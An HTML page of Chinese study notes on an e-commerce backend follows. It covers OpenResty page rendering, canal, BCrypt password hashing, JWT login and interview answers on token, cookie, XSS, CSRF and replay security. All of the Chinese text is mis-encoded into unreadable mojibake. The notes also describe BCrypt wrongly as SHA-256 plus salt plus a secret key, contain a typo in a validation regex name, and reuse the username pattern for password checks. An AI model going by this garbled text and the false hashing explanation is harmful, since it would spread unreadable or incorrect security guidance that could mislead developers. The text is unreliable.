<p>OpenRestyÂ® é€šè¿‡æ±‡èšå„ç§è®¾è®¡ç²¾è‰¯çš„ <a href="http://openresty.org/cn/nginx.html">Nginx</a> æ¨¡å—ï¼ˆä¸»è¦ç”± OpenResty å›¢é˜Ÿè‡ªä¸»å¼€å‘ï¼‰ï¼Œä»è€Œå°† <a href="http://openresty.org/cn/nginx.html">Nginx</a> æœ‰æ•ˆåœ°å˜æˆä¸€ä¸ªå¼ºå¤§çš„é€šç”¨ Web åº”ç”¨å¹³å°ã€‚è¿™æ ·ï¼ŒWeb å¼€å‘äººå‘˜å’Œç³»ç»Ÿå·¥ç¨‹å¸ˆå¯ä»¥ä½¿ç”¨ Lua è„šæœ¬è¯­è¨€è°ƒåŠ¨ <a href="http://openresty.org/cn/nginx.html">Nginx</a> æ”¯æŒçš„å„ç§ C ä»¥åŠ Lua æ¨¡å—ï¼Œå¿«é€Ÿæ„é€ å‡ºè¶³ä»¥èƒœä»» 10K ä¹ƒè‡³ 1000K ä»¥ä¸Šå•æœºå¹¶å‘è¿æ¥çš„é«˜æ€§èƒ½ Web åº”ç”¨ç³»ç»Ÿã€‚</p>
<p>OpenRestyÂ® çš„ç›®æ ‡æ˜¯è®©ä½ çš„WebæœåŠ¡ç›´æ¥è·‘åœ¨ <a href="http://openresty.org/cn/nginx.html">Nginx</a> æœåŠ¡å†…éƒ¨ï¼Œå……åˆ†åˆ©ç”¨ <a href="http://openresty.org/cn/nginx.html">Nginx</a> çš„éé˜»å¡ I&#x2F;O æ¨¡å‹ï¼Œä¸ä»…ä»…å¯¹ HTTP å®¢æˆ·ç«¯è¯·æ±‚,ç”šè‡³äºå¯¹è¿œç¨‹åç«¯è¯¸å¦‚ MySQLã€PostgreSQLã€Memcached ä»¥åŠ Redis ç­‰éƒ½è¿›è¡Œä¸€è‡´çš„é«˜æ€§èƒ½å“åº”ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨OpenRestyå®ç°å•†å“è¯¦æƒ…é¡µæ¸²æŸ“ï¼Œå¤§æ¦‚éœ€è¦è¿™æ ·çš„æ­¥éª¤ï¼š</p>
<ul>
<li>ç›‘å¬ç”¨æˆ·è¯·æ±‚,è¿›å…¥å®šä¹‰å¥½çš„luaè„šæœ¬</li>
<li>luaè„šæœ¬ä¸­å°è¯•è¯»å–redisæ•°æ®</li>
<li>è¯»å–æ•°æ®å¤±è´¥ï¼Œå°è¯•ä»<code>ly-page</code>è¯»å–æ•°æ®<ul>
<li>è·å–æ•°æ®å¤±è´¥ï¼šè¿”å›404</li>
<li>è·å–æ•°æ®æˆåŠŸï¼šå¼€å§‹æ¸²æŸ“</li>
</ul>
</li>
<li>æŠŠæ•°æ®å’Œæ¨¡æ¿äº¤ç»™templateæ¨¡å—æ¸²æŸ“ï¼Œç„¶åè¿”å›</li>
</ul>
<p>æˆ‘ä»¬è¦åšçš„äº‹æƒ…åŒ…æ‹¬ï¼š</p>
<ul>
<li>å®šä¹‰å†…éƒ¨è¯·æ±‚ä»£ç†ï¼š<ul>
<li>å½“éœ€è¦å‘<code>ly-page</code>è·å–æ•°æ®æ—¶ï¼Œèµ°è¿™ä¸ªå†…éƒ¨è¯·æ±‚ä»£ç†</li>
<li>å¯¹è¿™ä¸ªè¯·æ±‚åšé™æµå¤„ç†ï¼Œé˜²æ­¢å¹¶å‘è¿‡å¤§å¼•èµ·é›ªå´©</li>
</ul>
</li>
<li>å®šä¹‰é€šç”¨å·¥å…·æ¨¡å—ï¼š<ul>
<li>è®¿é—®Redisçš„å·¥å…·</li>
<li>è®¿é—®<code>ly-page</code>çš„httpå·¥å…·</li>
</ul>
</li>
<li>å®šä¹‰å•†å“è¯¦æƒ…é¡µé¢æ¨¡æ¿</li>
<li>ç¼–å†™æ•°æ®å¤„ç†çš„luaè„šæœ¬</li>
<li>ç¼–å†™å•†å“é¡µé¢è¯·æ±‚çš„è·¯å¾„æ˜ å°„</li>
</ul>
<p>è™½ç„¶å·²ç»å®ç°äº†é¡µé¢é™æ€åŒ–ï¼Œä¸è¿‡ä¾ç„¶æœ‰å€¼çš„ä¼˜åŒ–çš„åœ°æ–¹ï¼š</p>
<ul>
<li>åœ¨Nginxä¸­è®¾ç½®æœ¬åœ°ç¼“å­˜ï¼ŒæŠŠå‡ ä¹ä¸å˜çš„æ•°æ®ç›´æ¥å­˜å‚¨åœ¨nginxå†…éƒ¨ï¼Œä¾‹å¦‚ï¼š<ul>
<li>å•†å“åˆ†ç±»æ•°æ®</li>
<li>å“ç‰Œæ•°æ®</li>
<li>è§„æ ¼å‚æ•°æ•°æ®</li>
</ul>
</li>
<li>åœ¨nginxä¸­å¯¹ç”Ÿæˆçš„é¡µé¢åšç¼“å­˜æˆ–é™æ€åŒ–ï¼ŒåšCDNæœåŠ¡ï¼Œé¡µé¢ä¸å˜çš„æ—¶å€™ï¼Œå‡å°‘æ¸²æŸ“å¯¹CPUçš„æ¶ˆè€—</li>
<li>éšç€å•†å“æ•°æ®çš„æ—¥ç›Šå¢å¤šï¼ŒRediså¯èƒ½éš¾ä»¥æ”¯æŒæµ·é‡å•†å“ä¿¡æ¯ï¼Œæ­¤æ—¶å¯ä»¥ç”¨SSDBæ¥ä»£æ›¿ï¼ŒSSDBå­˜å‚¨åŸºäºç£ç›˜å­˜å‚¨ï¼ŒæŸ¥è¯¢æ€§èƒ½ä¸Rediså·®ä¸å¤šï¼Œå› æ­¤å¯ä»¥ä½œä¸ºæµ·é‡æ•°æ®çš„ç¼“å­˜åº“</li>
</ul>
<h2 id="canal"><a href="#canal" class="headerlink" title="canal"></a>canal</h2><p>æ¨¡æ‹Ÿsalve, ç›‘å¬binary logæ—¥å¿—;</p>
<p>è®¾ç½®è´¦å·æƒé™</p>
<ul>
<li>å¢ã€æ”¹ï¼šæˆ‘ä»¬å†™å…¥æ•°æ®åˆ°redis</li>
<li>åˆ ï¼šæˆ‘ä»¬æŠŠæ•°æ®ä»redisåˆ é™¤</li>
</ul>
<h1 id="ç”¨æˆ·ä¸­å¿ƒ"><a href="#ç”¨æˆ·ä¸­å¿ƒ" class="headerlink" title="ç”¨æˆ·ä¸­å¿ƒ"></a>ç”¨æˆ·ä¸­å¿ƒ</h1><h3 id="å¯†ç åŠ å¯†"><a href="#å¯†ç åŠ å¯†" class="headerlink" title="å¯†ç åŠ å¯†"></a>å¯†ç åŠ å¯†</h3><p>åŸºæœ¬é€»è¾‘ï¼š</p>
<ul>
<li>1ï¼‰æ ¡éªŒçŸ­ä¿¡éªŒè¯ç </li>
<li>2ï¼‰å¯¹å¯†ç åŠ å¯†</li>
<li>3ï¼‰å†™å…¥æ•°æ®åº“</li>
</ul>
<p>å¯†ç åŠ å¯†ï¼š</p>
<p>å¯†ç åŠ å¯†ä½¿ç”¨ä¼ ç»Ÿçš„MD5åŠ å¯†å¹¶ä¸å®‰å…¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯Springæä¾›çš„BCryptPasswordEncoderåŠ å¯†ç®—æ³•ï¼Œåˆ†æˆåŠ å¯†å’ŒéªŒè¯ä¸¤ä¸ªè¿‡ç¨‹ï¼š</p>
<ul>
<li><p>åŠ å¯†ï¼šç®—æ³•ä¼šå¯¹æ˜æ–‡å¯†ç éšæœºç”Ÿæˆä¸€ä¸ªsaltï¼Œä½¿ç”¨saltç»“åˆå¯†ç æ¥åŠ å¯†ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡ã€‚</p>
</li>
<li><p>éªŒè¯å¯†ç ï¼šéœ€è¦å…ˆæ‹¿åˆ°åŠ å¯†åçš„å¯†ç å’Œè¦éªŒè¯çš„å¯†ç ï¼Œæ ¹æ®å·²åŠ å¯†çš„å¯†ç æ¥æ¨æµ‹å‡ºsaltï¼Œç„¶ååˆ©ç”¨ç›¸åŒçš„ç®—æ³•å’Œsaltå¯¹è¦éªŒè¯ç çš„å¯†ç åŠ å¯†ï¼Œä¸å·²åŠ å¯†çš„å¯†ç å¯¹æ¯”å³å¯ã€‚</p>
</li>
</ul>
<p>ä¸ºäº†é˜²æ­¢æœ‰äººèƒ½æ ¹æ®å¯†æ–‡æ¨æµ‹å‡ºsaltï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä½¿ç”¨BCryptPasswordEncoderæ—¶é…ç½®éšå³å¯†é’¥ï¼Œåœ¨<code>com.leyou.user.config</code>åŒ…ä¸­åˆ›å»ºä¸€ä¸ªé…ç½®ç±»ï¼Œæ³¨å†Œ<code>BCryptPasswordEncoder</code>å¯¹è±¡</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">encoder:</span></span><br><span class="line">    <span class="attr">crypt:</span></span><br><span class="line">      <span class="attr">secret:</span> <span class="string">$&#123;random.uuid&#125;</span> <span class="comment"># éšæœºçš„å¯†é’¥ï¼Œä½¿ç”¨uuid</span></span><br><span class="line">      <span class="attr">strength:</span> <span class="number">6</span> <span class="comment"># åŠ å¯†å¼ºåº¦4~31ï¼Œå†³å®šç›åŠ å¯†æ—¶çš„è¿ç®—å¼ºåº¦ï¼Œè¶…è¿‡10ä»¥ååŠ å¯†è€—æ—¶ä¼šæ˜¾è‘—å¢åŠ </span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(User user, String code)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.æ ¡éªŒéªŒè¯ç </span></span><br><span class="line">    <span class="comment">// 1.1 å–å‡ºredisä¸­çš„éªŒè¯ç </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cacheCode</span> <span class="operator">=</span> redisTemplate.opsForValue().get(KEY_PREFIX + user.getPhone());</span><br><span class="line">    <span class="comment">// 1.2 æ¯”è¾ƒéªŒè¯ç </span></span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.equals(code, cacheCode)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;éªŒè¯ç é”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.å¯¹å¯†ç åŠ å¯†</span></span><br><span class="line">    user.setPassword(passwordEncoder.encode(user.getPassword()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.å†™å…¥æ•°æ®åº“</span></span><br><span class="line">    save(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨"><a href="#ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨" class="headerlink" title="ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨?"></a>ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨?</h4><p>MD5åŠ å¯†å¯ä»¥æŸ¥è¡¨;</p>
<h4 id="BCryptPasswordEncoderçš„åŸç†"><a href="#BCryptPasswordEncoderçš„åŸç†" class="headerlink" title="BCryptPasswordEncoderçš„åŸç†"></a>BCryptPasswordEncoderçš„åŸç†</h4><p>SHA-256 +éšæœºç›+å¯†é’¥å¯¹å¯†ç è¿›è¡ŒåŠ å¯†,è¿‡ç¨‹æ˜¯ä¸å¯ä»¥é€†çš„; åŠ å¯†(encode): ç®—å‡ºhashç„¶åå­˜å–æ•°æ®åº“,ç®—æ³•ä¸å¯é€†,å¯†ç å¼ºåº¦è¶…è¿‡10ä¼šå˜æ…¢;  å¯†ç åŒ¹é…(matches): éªŒè¯å¯†ç å’Œhashæœ‰æ²¡æœ‰é—®é¢˜,ç„¶åé€šè¿‡å­˜å…¥æ•°æ®åº“çš„hashè®¡ç®—å‡ºsalt,ç„¶åå†å»åŠ å¯†æ¯”å¯¹;</p>
<h2 id="æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ"><a href="#æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ" class="headerlink" title="æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ"></a>æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ</h2><p>ä½¿ç”¨Hibernate-Validator(ç”¨æ³¨è§£çš„æ–¹å¼@Email @Pattern(value) ç­‰)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_R EGEX, message &#x3D; â€œç”¨æˆ·åæ ¼å¼ä¸æ­£ç¡®â€)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_REGEX, message &#x3D; â€œå¯†ç æ ¼å¼ä¸æ­£ç¡®â€)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.PHONE_REGEX, message &#x3D; â€œæ‰‹æœºå·æ ¼å¼ä¸æ­£ç¡®â€)</p>
<h1 id="jwtç™»å½•"><a href="#jwtç™»å½•" class="headerlink" title="jwtç™»å½•"></a>jwtç™»å½•</h1><p>ç”¨å¯¹ç§°åŠ å¯†çš„è¯ä¼šå¤šä¸€æ¬¡è°ƒç”¨;  è®¢å•é‚£é‡Œè¿˜éœ€è¦å†æ¬¡è§£æjwt, ä¸‹å•éœ€è¦çŸ¥é“ç”¨æˆ·ä¿¡æ¯, æ¯ä¸ªçº¿ç¨‹ç»‘å®šå¯¹åº”çš„ç”¨æˆ·ä¿¡æ¯, ä½¿ç”¨ThreadLocal; ç”¨å¯¹ç§°åŠ å¯†å°±éœ€è¦è§£æ4æ¬¡, ç”¨Rsaåªéœ€è¦è§£æ2æ¬¡; </p>
<p>ç”¨æˆ·ç™»å½•ä¿¡æ¯<strong>æ ¡éªŒå¤±è´¥ä»¥å</strong>ï¼Œåˆ¤æ–­ç”¨æˆ·è·¯å¾„æ˜¯å¦æ˜¯ç™½åå•ä¸­çš„è·¯å¾„ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œï¼Œå¦‚æœä¸æ˜¯åˆ™æ‹¦æˆªã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149732.png" alt="image-20200325115057407"></p>
<h2 id="é¢è¯•å¸¸è§é—®é¢˜"><a href="#é¢è¯•å¸¸è§é—®é¢˜" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><h3 id="jwtå’Œsecurityçš„å¯¹æ¯”ï¼š"><a href="#jwtå’Œsecurityçš„å¯¹æ¯”ï¼š" class="headerlink" title="jwtå’Œsecurityçš„å¯¹æ¯”ï¼š"></a>jwtå’Œsecurityçš„å¯¹æ¯”ï¼š</h3><p>JWTçš„ï¼š</p>
<ul>
<li><p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ— éœ€å†æœåŠ¡ç«¯å­˜å‚¨ç”¨æˆ·æ•°æ®ï¼Œå‡è½»æœåŠ¡ç«¯å‹åŠ›</li>
<li>è½»é‡çº§ï¼Œjsoné£æ ¼ï¼Œæ¯”è¾ƒç®€å•</li>
<li>è·¨è¯­è¨€</li>
</ul>
</li>
<li><p>æœ‰åˆ©äºæ°´å¹³æ‰©å±•</p>
</li>
<li><p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>tokenä¸€æ—¦ç­¾å‘ï¼Œæ— æ³•ä¿®æ”¹<ul>
<li>æ— æ³•æ›´æ–°tokenæœ‰æ•ˆæœŸï¼Œç”¨æˆ·ç™»å½•çŠ¶æ€åˆ·æ–°éš¾ä»¥å®ç°</li>
<li>æ— æ³•é”€æ¯ä¸€ä¸ªtokenï¼ŒæœåŠ¡ç«¯ä¸èƒ½å¯¹ç”¨æˆ·çŠ¶æ€è¿›è¡Œç»å¯¹æ§åˆ¶</li>
</ul>
</li>
<li>ä¸åŒ…å«æƒé™æ§åˆ¶</li>
</ul>
</li>
</ul>
<p>SpringSecurityï¼š</p>
<ul>
<li><p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç”¨æˆ·ä¿¡æ¯ä¿å­˜å†æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å¯ä»¥å¯¹ç”¨æˆ·çŠ¶æ€ç»å¯¹æ§åˆ¶</li>
<li>åŸºäºSpringï¼Œæ— ç¼æ•´åˆï¼Œä¿®æ”¹ç™»å½•é€»è¾‘ï¼Œå…¶å®å°±æ˜¯æ·»åŠ è¿‡æ»¤å™¨</li>
<li>æ•´åˆæƒé™ç®¡ç†</li>
</ul>
</li>
<li><p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>é™å®šäº†è¯­è¨€</li>
<li>å®ç°å¤æ‚ï¼ŒåŸºäºä¸€è¿ä¸²çš„è¿‡æ»¤å™¨é“¾</li>
<li>éœ€è¦å†æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œå¢åŠ æœåŠ¡ç«¯å‹åŠ›</li>
<li>ä¾èµ–äºtomcatçš„HttpSessionã€å¦‚æœæ˜¯åˆ†å¸ƒå¼é¡¹ç›®ï¼Œsessionä¸å…±äº«ï¼Œç™»å½•å¤±æ•ˆï¼Œéœ€è¦å€ŸåŠ©äºSpringSessionï¼Œå®ç°å…±äº«sessionæ•ˆæœï¼ˆåˆ©ç”¨redisä»£æ›¿tomcatçš„session</li>
</ul>
</li>
</ul>
<h3 id="ç™»å½•æ§åˆ¶é—®é¢˜"><a href="#ç™»å½•æ§åˆ¶é—®é¢˜" class="headerlink" title="ç™»å½•æ§åˆ¶é—®é¢˜"></a>ç™»å½•æ§åˆ¶é—®é¢˜</h3><ul>
<li><p>ä½ ä»¬ä½¿ç”¨JWTåšç™»å½•å‡­è¯ï¼Œå¦‚ä½•è§£å†³tokenæ³¨é”€é—®é¢˜</p>
<p>ç­”ï¼šjwtçš„ç¼ºé™·æ˜¯tokenç”Ÿæˆåæ— æ³•ä¿®æ”¹ï¼Œå› æ­¤æ— æ³•è®©tokenå¤±æ•ˆã€‚åªèƒ½é‡‡ç”¨å…¶å®ƒæ–¹æ¡ˆæ¥å¼¥è¡¥ï¼ŒåŸºæœ¬æ€è·¯å¦‚ä¸‹ï¼š</p>
<p>  1ï¼‰ç”¨æˆ·ç™»å½•åï¼Œç”ŸæˆJWTï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·èº«ä»½</p>
<p>  2ï¼‰ä»¥ç”¨æˆ·idä¸ºkeyï¼ŒæŠŠJWTçš„idå­˜å…¥redisï¼Œåªæœ‰redisä¸­æœ‰idçš„JWTï¼Œæ‰æ˜¯æœ‰æ•ˆçš„JWT</p>
<p>  3ï¼‰å¹¶ä¸”ç»™Redisè®¾ç½®æœ‰æ•ˆæœŸï¼Œæœ‰æ•ˆæœŸåˆ°è‡ªåŠ¨åˆ é™¤</p>
<p>  4ï¼‰é€€å‡ºç™»å½•æ—¶ï¼ŒæŠŠIDä»Redisåˆ é™¤å³å¯</p>
</li>
<li><p>æ€ä¹ˆè§£å†³ç™»å½•è¶…æ—¶åçš„ç™»å½•ç»­ç­¾é—®é¢˜ï¼Ÿ</p>
<p>ç­”ï¼šåˆ¤æ–­ç™»å½•æ˜¯å¦è¶…æ—¶çš„æ ‡å‡†æ˜¯redisï¼Œè€Œä¸æ˜¯JWTï¼Œå› æ­¤æ¯æ¬¡ç”¨æˆ·è®¿é—®ç½‘å…³ï¼Œæˆ‘ä»¬éƒ½ä¼šåˆ·æ–°redisçš„æ•°æ®æœ‰æ•ˆæœŸï¼Œä¿è¯ç™»å½•çŠ¶æ€ä¸æ–­ã€‚</p>
</li>
<li><p>å¦‚ä½•è§£å†³å¼‚åœ°ç™»å½•æˆ–è·¨è®¾å¤‡ç™»å½•é—®é¢˜ï¼Ÿ</p>
<p>ç­”ï¼š</p>
<p>æ–¹æ¡ˆä¸€ï¼šä¸å…è®¸å¤šç«¯ç™»å½•</p>
<p>å¦‚æœè´¦æˆ·åœ¨ç¬¬äºŒä¸ªè®¾å¤‡ç™»å½•ï¼Œè‡ªç„¶ä¼šå°†redisä¸­çš„JWTè¦†ç›–ï¼Œé‚£ä¹ˆä¹‹å‰çš„ç™»å½•å‡­è¯å°±æˆäº†æ— æ•ˆå‡­è¯ã€‚</p>
<p>æ–¹æ¡ˆäºŒï¼šå…è®¸å¤šç«¯ç™»å½•</p>
<p>å­˜å…¥redisæ—¶ï¼Œredisçš„ç±»å‹å¯ä»¥é€‰æ‹©setï¼Œè¿™æ ·ä¸€ä¸ªç”¨æˆ·å¯ä»¥å…·å¤‡å¤šä¸ªJWTçš„idï¼Œå®ç°å¤šç«¯ç™»å½•ã€‚</p>
</li>
</ul>
<h3 id="cookieå®‰å…¨é—®é¢˜"><a href="#cookieå®‰å…¨é—®é¢˜" class="headerlink" title="cookieå®‰å…¨é—®é¢˜"></a>cookieå®‰å…¨é—®é¢˜</h3><ul>
<li><p>å¦‚ä½•è§£å†³tokenè¢«ç¯¡æ”¹é—®é¢˜ï¼Ÿ</p>
<ul>
<li>ç­”ï¼štokenä¸­çš„æ•°æ®å¯ä»¥ç¯¡æ”¹ï¼Œä½†æ˜¯ç­¾åæ— æ³•ç¯¡æ”¹ï¼Œå¦åˆ™æœåŠ¡ç«¯è®¤è¯æ ¹æœ¬ä¸ä¼šé€šè¿‡ï¼Œå› æ­¤ç¯¡æ”¹çš„tokenæ˜¯æ— æ³•é€šè¿‡æœåŠ¡ç«¯æ ¡éªŒçš„</li>
</ul>
</li>
<li><p>å¦‚ä½•é˜²æ­¢tokençš„ä¼ªé€ </p>
<p>ä¸ä¸Šä¸ªé—®é¢˜ç±»ä¼¼ï¼Œtokenä¸­å¸¦æœ‰ç­¾åè®¤è¯ï¼Œè€Œç­¾åéœ€è¦ç§é’¥åŠ å¯†ç”Ÿæˆã€‚åªè¦ç§é’¥ä¸æ³„éœ²ï¼Œå°±ä¸å¯èƒ½æœ‰äººä¼ªé€ tokenï¼Œå› ä¸ºå…¶å®ƒç§˜é’¥ç”Ÿæˆçš„tokenæ˜¯ä¸ä¼šè¢«å…¬é’¥è®¤å¯çš„ã€‚</p>
</li>
<li><p>å¦‚ä½•è§£å†³cookieè¢«ç›—ç”¨é—®é¢˜ï¼Ÿ  åˆ†å¸ƒå¼çš„è¯å­˜åˆ°redis,</p>
<p>ç­”ï¼šcookieè¢«ç›—ç”¨çš„å¯èƒ½æ€§ä¸»è¦åŒ…æ‹¬ä¸‹é¢å‡ ç§ï¼š</p>
<ul>
<li><p>XSSæ”»å‡»ï¼šè¿™ä¸ªå¯ä»¥å†å‰ç«¯é¡µé¢æ¸²æŸ“æ—¶å¯¹ æ•°æ®åšå®‰å…¨å¤„ç†å³å¯ï¼Œè€Œä¸”æˆ‘ä»¬çš„cookieä½¿ç”¨äº†Httponlyä¸ºtrueï¼Œå¯ä»¥é˜²æ­¢JSè„šæœ¬çš„æ”»å‡»ã€‚ </p>
</li>
<li><p>CSRFæ”»å‡»ï¼š</p>
<ul>
<li>åˆ©ç”¨Refererå¤´ï¼Œé˜²ç›—é“¾</li>
<li>è¯·æ±‚å¤´ä¸­åŠ éšæœºç </li>
</ul>
</li>
<li><p>æ•°æ®æŠ“åŒ…ï¼Œè·å–ç”¨æˆ·cookieï¼šæˆ‘ä»¬é‡‡ç”¨äº†HTTPSåè®®é€šä¿¡ï¼Œæ— æ³•è·å–è¯·æ±‚çš„ä»»ä½•æ•°æ®</p>
</li>
<li><p>è¯·æ±‚é‡æ”¾æ”»å‡»ï¼šå¯¹äºæ™®é€šç”¨æˆ·çš„è¯·æ±‚æ²¡æœ‰å¯¹è¯·æ±‚é‡æ”¾åšé˜²å¾¡ï¼Œè€Œæ˜¯å¯¹éƒ¨åˆ†ä¸šåŠ¡åšå¥½äº†å¹‚ç­‰å¤„ç†ã€‚è¿è¡Œç®¡ç†ç³»ç»Ÿä¸­ä¼šå¯¹tokenæ·»åŠ éšæœºç ï¼Œè®¤è¯tokenä¸€æ¬¡æœ‰æ•ˆï¼Œæ¥é¢„é˜²è¯·æ±‚é‡æ”¾æ”»å‡»ã€‚</p>
<p>(1)**åŠ <a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0/2454368">éšæœºæ•°</a>**ã€‚è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯è®¤è¯åŒæ–¹ä¸éœ€è¦æ—¶é—´åŒæ­¥ï¼ŒåŒæ–¹è®°ä½ä½¿ç”¨è¿‡çš„<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0">éšæœºæ•°</a>ï¼Œå¦‚å‘ç°<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87">æŠ¥æ–‡</a>ä¸­æœ‰ä»¥å‰ä½¿ç”¨è¿‡çš„éšæœºæ•°ï¼Œå°±è®¤ä¸ºæ˜¯é‡æ”¾æ”»å‡»ã€‚ç¼ºç‚¹æ˜¯éœ€è¦é¢å¤–ä¿å­˜ä½¿ç”¨è¿‡çš„éšæœºæ•°ï¼Œè‹¥è®°å½•çš„æ—¶é—´æ®µè¾ƒé•¿ï¼Œåˆ™ä¿å­˜å’ŒæŸ¥è¯¢çš„å¼€é”€è¾ƒå¤§ã€‚ [4] </p>
<p>(2)**åŠ <a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E6%88%B3">æ—¶é—´æˆ³</a>**ã€‚è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯ä¸ç”¨é¢å¤–ä¿å­˜å…¶ä»–ä¿¡æ¯ã€‚ç¼ºç‚¹æ˜¯è®¤è¯åŒæ–¹éœ€è¦å‡†ç¡®çš„æ—¶é—´åŒæ­¥ï¼ŒåŒæ­¥è¶Šå¥½ï¼Œå—æ”»å‡»çš„å¯èƒ½æ€§å°±è¶Šå°ã€‚ä½†å½“ç³»ç»Ÿå¾ˆåºå¤§ï¼Œè·¨è¶Šçš„åŒºåŸŸè¾ƒå¹¿æ—¶ï¼Œè¦åšåˆ°ç²¾ç¡®çš„æ—¶é—´åŒæ­¥å¹¶ä¸æ˜¯å¾ˆå®¹æ˜“ã€‚ [4] </p>
<p>(3)**åŠ <a href="https://baike.baidu.com/item/%E6%B5%81%E6%B0%B4%E5%8F%B7/5623476">æµæ°´å·</a>**ã€‚å°±æ˜¯åŒæ–¹åœ¨æŠ¥æ–‡ä¸­æ·»åŠ ä¸€ä¸ªé€æ­¥é€’å¢çš„æ•´æ•°ï¼Œåªè¦æ¥æ”¶åˆ°ä¸€ä¸ªä¸è¿ç»­çš„æµæ°´å·æŠ¥æ–‡(å¤ªå¤§æˆ–å¤ªå°)ï¼Œå°±è®¤å®šæœ‰é‡æ”¾å¨èƒã€‚è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯ä¸éœ€è¦æ—¶é—´åŒæ­¥ï¼Œä¿å­˜çš„ä¿¡æ¯é‡æ¯”éšæœºæ•°æ–¹å¼å°ã€‚ç¼ºç‚¹æ˜¯ä¸€æ—¦æ”»å‡»è€…å¯¹æŠ¥æ–‡è§£å¯†æˆåŠŸï¼Œå°±å¯ä»¥è·å¾—æµæ°´å·ï¼Œä»è€Œæ¯æ¬¡å°†æµæ°´å·é€’å¢æ¬ºéª—è®¤è¯ç«¯ã€‚</p>
</li>
<li><p>ç”¨æˆ·ç”µè„‘ä¸­æ¯’ï¼šè¿™ä¸ªæ— æ³•é˜²èŒƒã€‚</p>
</li>
</ul>
</li>
<li><p>ç”¨æˆ·çš„cookieè¢«ç¦ç”¨æ€ä¹ˆåŠï¼Ÿ</p>
<ul>
<li>cookieä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ˜¯ä¸ä¼šè¢«ç¦ç”¨ï¼Œå› ä¸ºæ™®é€šäººæ ¹æœ¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ˜¯cookieï¼Œä¸€èˆ¬ä¸ç”¨ç®¡ï¼Œä¸ºäº†å‹å¥½ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ç”¨æˆ·ä¸€ä¸ªæç¤ºï¼šä½ çš„cookieå·²ç»è¢«ç¦ç”¨äº†ï¼Œè¯·å¯ç”¨cookieã€‚</li>
<li>æŠŠjwtä½œä¸ºå“åº”å¤´è¿”å›ï¼Œæµè§ˆå™¨ä¸­JSæŠŠtokenå†™åˆ°æœ¬åœ°å­˜å‚¨ï¼ˆsessionStorageï¼‰ï¼Œè¦æ±‚å‰ç«¯æ¯æ¬¡å‘ajaxï¼Œéƒ½å¿…é¡»è‡ªå·±æºå¸¦tokenã€‚è€Œä¸”æœ‰è¢«xssæ”»å‡»çš„é£é™©</li>
</ul>
</li>
</ul>
<h3 id="æƒé™é—®é¢˜"><a href="#æƒé™é—®é¢˜" class="headerlink" title="æƒé™é—®é¢˜"></a>æƒé™é—®é¢˜</h3><ul>
<li><p>å¦‚ä½•å®Œæˆæƒé™æ ¡éªŒçš„ï¼Ÿ</p>
<ul>
<li>é¦–å…ˆæˆ‘ä»¬æœ‰æƒé™ç®¡ç†çš„æœåŠ¡ï¼Œç®¡ç†ç”¨æˆ·çš„å„ç§æƒé™ï¼ŒåŠå¯è®¿é—®è·¯å¾„ç­‰</li>
<li>åœ¨ç½‘å…³ä¸­åˆ©ç”¨è¿‡æ»¤å™¨ï¼Œæ‹¦æˆªä¸€åˆ‡è¯·æ±‚ï¼Œåœ¨è¿‡æ»¤å™¨ä¸­ï¼Œè§£æå’ŒéªŒè¯jwtï¼Œè·å–ç”¨æˆ·èº«ä»½ï¼ŒæŸ¥è¯¢ç”¨æˆ·æƒé™ï¼Œåˆ¤æ–­ç”¨æˆ·èº«ä»½å¯ä»¥è®¿é—®å½“å‰è·¯å¾„</li>
</ul>
</li>
